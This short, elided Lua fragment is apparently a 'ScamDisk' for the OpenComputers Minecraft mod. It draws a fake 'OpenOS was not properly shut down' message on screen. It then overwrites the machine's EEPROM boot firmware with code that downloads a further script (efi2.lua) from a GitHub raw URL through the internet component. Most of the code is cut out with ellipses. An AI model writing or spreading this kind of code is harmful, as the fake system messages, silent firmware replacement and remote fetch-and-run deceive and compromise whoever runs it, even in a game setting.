...
local code = [[local cp, cl = component.proxy, component.list
local gpu = cp(cl("gpu")())
...
gpu.set(5, 5, "Because OpenOS was not properly shut down,")
...
eeprom.set([[local handle, data, chunk = component.proxy(component.list("internet")()).request("https://raw.githubusercontent.com/KKosty4ka/OpenComputers-ScamDisk/master/efi2.lua"), ""
